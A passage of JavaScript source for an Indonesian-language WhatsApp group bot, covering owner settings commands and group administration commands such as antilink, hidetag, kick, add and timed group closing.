{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
xdev.sendButMessage(from, `SETTING MENU\n1.lokasi\n2.lokasi2\n3.img\n4.document\n5.gif`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setmenu document`, buttonText: {displayText: `DOCUMENT`},type: 1},
{buttonId: `${prefix}setmenu image`, buttonText: {displayText: `IMAGE`},type: 1},
{buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `LOCATION`},type: 1}],setQuoted);
} else {
setReply("Menu tidak di temukan om")
}
break
case 'settextmenu':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'menu1' ){
textMenu = "menu1"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'menu2' ){
textMenu = "menu2"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'menu3'){
textMenu = "menu3"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan text menu ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
xdev.sendButMessage(from, `SETTING TEXT MENU\n1.menu1\n2.menu2\n3.menu3`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}settextmenu menu1`, buttonText: { displayText: `MENU1`},type: 1},
{buttonId: `${prefix}settextmenu menu2`, buttonText: { displayText: `MENU2`},type: 1},
{buttonId: `${prefix}settextmenu menu3`, buttonText: { displayText: `MENU3`},type: 1}],setQuoted);
} else {
setReply("Text Menu tidak di temukan om")
}
break
case 'settextfitur':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'fitur1' ){
textFitur = "fitur1"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'fitur2' ){
textFitur = "fitur2"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'fitur3'){
textFitur = "fitur3"
await xdev.sendButMessage(from, `Berhasil mengubah tampilan text fitur ke ${q}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
xdev.sendButMessage(from, `SETTING TEXT FITUR\n1.fitur1\n2.fitur2\n3.fitur3`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}settextfitur fitur1`, buttonText: { displayText: `FITUR1`},type: 1},
{buttonId: `${prefix}settextfitur fitur2`, buttonText: { displayText: `FITUR2`},type: 1},
{buttonId: `${prefix}settextfitur fitur3`, buttonText: { displayText: `FITUR3`},type: 1}],setQuoted);
} else {
setReply("Text Fitur tidak di temukan om")
}
break
case 'setreply':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(replyType === "web") return setReply("Udah aktif")
replyType = "web"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'web2'|| (args[0]) === 'gc' ){
if(replyType === "web2") return setReply("Udah aktif")
replyType = "web2"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'mess'){
if(replyType === "mess") return setReply("Udah aktif")
replyType = "mess"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(replyType === "troli") return setReply("Udah aktif")
replyType = "troli"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
xdev.sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. web2\n5. troli2`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `WEB`},type: 1},
{buttonId: `${prefix}setreply web2`, buttonText: {displayText: `WEB2`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `MESS`},type: 1}]);
} else {
setReply("Set Reply Tidak Di Temukan")
}
}
break
case 'setbio':   
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return setReply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await xdev.setStatus(q)
await setReply(`Berhasil mengganti status bio ke *${q}*`)
}
break
case 'setgif':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (isVideo || isQuoteVideo){
let delb = await xdev.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./ACTION/PLICE/VIDEO/video.mp4`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah gif`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setgif`);
}
}
break
case 'setquoted':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
if(Qoted === "ftoko") return setReply("Udah aktif")
Qoted = "ftoko"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftoko})
} else if ((args[0]) === 'fkontak' ){
if(Qoted === "fkontak") return setReply("Udah aktif")
Qoted = "fkontak"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fkontak})
} else if ((args[0]) === 'ftext'){
if(Qoted === "ftext") return setReply("Udah aktif")
Qoted = "ftext"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftext})
} else if ((args[0]) === 'ftroli'){
if(Qoted === "ftroli") return setReply("Udah aktif")
Qoted = "ftroli"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: ftroli})
} else if ((args[0]) === 'floc'){
if(Qoted === "floc") return setReply("Udah aktif")
Qoted = "floc"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: floc})
} else if ((args[0]) === 'fimage'){
if(Qoted === "fimage") return setReply("Udah aktif")
Qoted = "fimage"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fimage})
} else if ((args[0]) === 'fdoc' ){
if(Qoted === "fdoc") return setReply("Udah aktif")
Qoted = "fdoc"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fdoc})
} else if ((args[0]) === 'fvid'){
if(Qoted === "fvid") return setReply("Udah aktif")
Qoted = "fvid"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvid})
} else if ((args[0]) === 'fgc'){
if(Qoted === "fgc") return setReply("Udah aktif")
Qoted = "fgc"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgc})
} else if ((args[0]) === 'fgif'){
if(Qoted === "fgif") return setReply("Udah aktif")
Qoted = "fgif"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fgif})
}else if ((args[0]) === 'fvn'){
if(Qoted === "fvn") return setReply("Udah aktif")
Qoted = "fvn"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: fvn})
} else if ((args[0]) === 'dev'){
if(Qoted === "dev") return setReply("Udah aktif")
Qoted = "dev"
await xdev.sendMessage(from, {text: `Berhasil mengubah quoted ke ${q}`}, {quoted: dev})
} else if (!q) {
xdev.sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
{buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
{buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}],setQuoted);
} else {
let teks =`Quoted yang kamu masukan salah\nSilakan pilih salah satu quoted berikut:\n1.ftoko\n2.fkontak\n3.ftext\n4.ftroli\n5.floc\n6.fimage\n7.fdoc\n8.fvid\n9.fgc\n10.fgif\n11.fvn\n12.dev`
setReply(teks)
}
break
case 'setnamebot':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
setReply(`Berhasil mengubah nama bot ke ${q}`)
botName = `${q}`
break
case 'setppbot':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (isImage || isQuotedImage) {
var media = await xdev.downloadAndSaveMediaMessage(quoted)
var data =  await xdev.updateProfilePicture(botNumber, { url: media })
fs.unlinkSync(media)
setReply(`Sukses`)
} else {
setReply(`Kirim/balas gambar dengan caption ${command} untuk mengubah foto profil bot`)
}
break
case 'setexif':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
var namaPack = q.split('|')[0] ? q.split('|')[0] : q
var authorPack = q.split('|')[1] ? q.split('|')[1] : ''
exif.create(namaPack, authorPack)
setReply(`Sukses membuat exif`)
break
case 'setprefix':
{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let teks =`SETTING PREFIX\n\nSilakan masukkan prefix\nOptions :\n=> multi\n=> nopref\n=> allpref`
if (q === 'multi'){
multi = true
nopref = false
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'nopref'){
multi = false
nopref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (q === 'allpref'){
multi = false
nopref = false
allpref = true
setReply(`Berhasil mengubah prefix ke *「 ${q} 」*`)
} else if (!q) {
xdev.sendButMessage(from, teks, fake, [
{buttonId: `${prefix}setprefix multi`, buttonText: {displayText: `ᴍᴜʟᴛɪ`},type: 1},
{buttonId: `${prefix}setprefix nopref`, buttonText: {displayText: `ɴᴏᴘʀᴇғ`},type: 1},
{buttonId: `${prefix}setprefix allpref`, buttonText: { displayText: `ᴀʟʟᴘʀᴇғ`},type: 1}]);
} else {
multi = false
nopref = false
prefa = `${q}`
setReply(`Berhasil anying mengubah prefix ke *「 ${q} 」*`)
} 
}
break  
case 'setwelcome':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'type1' ) {
if(setwelcome === "type1") return setReply("Udah aktif")
setwelcome = "type1"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if ((args[0]) === 'type2' ) {
if(setwelcome === "type2") return setReply("Udah aktif")
setwelcome = "type2"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if ((args[0]) === 'type3' ) {
if(setwelcome === "type3") return setReply("Udah aktif")
setwelcome = "type3"
setReply(`Berhasil mengubah welcome ke 「 ${q} 」`)
} else if (!q) {
xdev.sendButMessage(from, `SETTING WELCOME`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setwelcome type1`, buttonText: {displayText: `Type1`},type: 1},
{buttonId: `${prefix}setwelcome type2`, buttonText: {displayText: `Type2`},type: 1},
{buttonId: `${prefix}setwelcome type3`, buttonText: { displayText: `Type3`},type: 1}],setQuoted);
} else {
let teks =`Query tidak diremukan\nSilakan pilih salah satu:\n1.type1\n2.type2\n3.type3`
setReply(teks)
}
break
case 'setwelcomeintro':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
setintro = `${q}`
setReply(`Berhasil mengubah text intro ke 「 ${q} 」`)
}
break
case 'setwelcomeout':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
setoutro = `${q}`
setReply(`Berhasil mengubah text out ke 「 ${q} 」`)
}
break
case 'setdocument':
case 'setdoc':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if ((args[0]) === 'zip' ) {
if(docType === "zip") return setReply("Udah aktif")
docType = "zip"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'pdf' ) {
if(docType === "pdf") return setReply("Udah aktif")
docType = "pdf"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'pptx' ) {
if(docType === "pptx") return setReply("Udah aktif")
docType = "pptx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'xlsx' ) {
if(docType === "xlsx") return setReply("Udah aktif")
docType = "xlsx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if ((args[0]) === 'docx' ) {
if(docType === "docx") return setReply("Udah aktif")
docType = "docx"
setReply(`Berhasil mengubah docmunet ke 「 ${q} 」`)
} else if (!q) {
xdev.sendButMessage(from, `SETTING DOCUMENT`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setdocument pdf`, buttonText: {displayText: `Pdf`},type: 1},
{buttonId: `${prefix}setdocument xlsx`, buttonText: {displayText: `Xlsx`},type: 1},
{buttonId: `${prefix}setdocument pptx`, buttonText: { displayText: `Pptx`},type: 1}],setQuoted);
} else {
let teks =`Document tidak diremukan\nSilakan pilih salah satu:\n1.zip\n2.pdf\n3.pptx\n4.xlsx\n5.docx`
setReply(teks)
}
break
case 'setfake':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
fake = `${q}`
setReply(`Berhasil mengubah text fake ke 「 ${q} 」`)
}
break
case 'settextreply':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
textreply = `${q}`
setReply(`Berhasil mengubah text reply ke 「 ${q} 」`)
}
break
case 'setnamaowner':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
ownerName = `${q}`
setReply(`Berhasil mengubah nama owner ke 「 ${q} 」`)
}
break
case 'setnamabot':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
botName = `${q}`
setReply(`Berhasil mengubah nama bot ke 「 ${q} 」`)
}
break
case 'setnomerowner':
case 'setnoowner':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Nomernya?`)
if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
if ((args[0]) === `${q}` ) {
nomerOwner = `${q}`
setReply(`Berhasil mengubah nomer owner ke 「 ${q} 」`)
}
break
//━━━━━━━━━━━━━━━[ GRPUP ]━━━━━━━━━━━━━━━━━//
case 'antilinkgc':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink group telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntilinkGc) return setReply('Udah mati')
removeDataId (command, from, DataId)
let ih =`Fitur antilink group telah di matikan`
setReply(ih)
}else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
}
}
break;  
case 'antihidetag':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isGroup) return setReply('hanya bisa di group')
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntihidetag) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur anti hidetag telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntihidetag) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur anti hidetag telah di matikan`
setReply(ih)
} else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antihidetag on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antihidetag off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'antilink':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiLink) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiLink) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur antilink telah di matikan`
setReply(ih)
} else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'antivirtex':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && isOwner) return onlyAdmin()
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiVirtex) return reply('Sudah Aktif')
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan antivirtex!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiVirtex) return reply('Sudah Mati')
removeDataId (command, from, DataId)
setReply("Sukses mematikan antivirtex!");
} else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, [
{buttonId: `${prefix}antivirtex on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antivirtex off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'antiasing':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isKickarea) return setReply("Sudah aktif!!");
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan kickarea!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isKickarea) return setReply("Udah off!!");
removeDataId (command, from, DataId)
setReply("Sukses mematikan kickarea!");
} else if (!q) {
xdev.sendButMessage(from, `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐒𝐀𝐋𝐀𝐇 𝐒𝐀𝐓𝐔`, `${fake}`, 
[{buttonId: `${prefix}kickarea on`, buttonText: { displayText: `on`,},type: 1,},
{buttonId: `${prefix}kickarea off`, buttonText: { displayText: `off`,}, type: 1}, ]);
}
}
break;
case 'infogc': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
let _meta = await xdev.groupMetadata(from)
console.log(_meta)
let _img = await xdev.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await xdev.sendMessage(from,{
caption,
image: await getBuffer(_img)
},
{ quoted: setQuoted }
)
}
break
case 'linkgc':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
var url = await xdev.groupInviteCode(from).catch(() => setReply(mess.error.api))
let asu = 'https://chat.whatsapp.com/'+url
setReply(asu)
}
break
case 'setppgc':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (isImage || isQuotedImage) {
let media = await xdev.downloadAndSaveMediaMessage(quoted)
await xdev.updateProfilePicture(from, { url: media })
.then( res => {
setReply(`Sukses`)
fs.unlinkSync(media)
}).catch(() => setReply(mess.error.api))
} else {
setReply(`Kirim/balas gambar dengan caption ${command}`)
}
}
break
case 'setnamegc':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args.length < 2) return setReply(`Kirim perintah ${command} teks`)
await xdev.groupUpdateSubject(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break
case 'setdesc': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args.length < 2) return setReply(`Kirim perintah ${command} teks`)
await xdev.groupUpdateDescription(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break
case 'gc':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!q) return setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == "close") {
xdev.groupSettingUpdate(from, 'announcement')
setReply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
xdev.groupSettingUpdate(from, 'not_announcement')
setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
}
break
case 'hidetag':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
let mem = [];
groupMembers.map( i => mem.push(i.id) )
xdev.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'infoall': case 'tagall':
if (!isGroup) return setReply(mess.only.group)
if(!q) {
var inpo = "No inpo"
} else var inpo = q
let members_id = []
let tes = '\n'
await groupMembers.map( i => {
tes += `┣ ⬣@${i.id.split('@')[0]}\n`
members_id.push(i.id) })
mentions(`
*From :* ${pushname}

 Info :  ${inpo}

Total Member : ${groupMembers.length} 

┏━⬣`+tes+`┗━⬣`, members_id, false)
break
case 'revoke':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
await xdev.groupRevokeInvite(from)
.then( res => {
setReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => setReply(mess.error.api))
break
case 'kick': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!input) return setReply("Tag/Mention/Masukan nomer target")
if (input.startsWith('08')) return setReply('Awali nomor dengan 62')
await xdev.groupParticipantsUpdate(from, [input], 'remove').then((res) => setReply(`Sukses kick ${input.split("@")[0]}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'add': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!input) return setReply("Tag/Mention/Masukan nomer target")
if (input.startsWith('08')) return setReply('Awali nomor dengan 62')
await xdev.groupParticipantsUpdate(from, [input], 'add').then((res) => setReply(`Berhasil menambahkan ${input.split("@")[0]} ke dalam group ${groupName}`)).catch((err) => setReply(jsonformat(err))) 
}
break
case 'closetime': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = dev.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
xdev.groupSettingUpdate(from, 'announcement')
setReply(close)
}, timer)
break				
case 'opentime':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = dev.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
xdev.groupSettingUpdate(from, 'not_announcement')
setReply(open)
}, timer)
break  
case 'demote': case 'member': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!input) return setReply("Tag/Mention/Masukan nomer target")
if (input.startsWith('08')) return setReply('Awali nomor dengan 62')
await xdev.groupParticipantsUpdate(from, [input], 'demote').then((res) => setReply(`Sukses Demote ${input.split("@")[0]}`)).catch((err) => setReply(jsonformat(err)))
}
break
case 'admin': case 'promote': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isGroup) return onlyGroup() 
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!input) return setReply("Tag/Mention/Masukan nomer target")
if (input.startsWith('08')) return setReply('Awali nomor dengan 62')
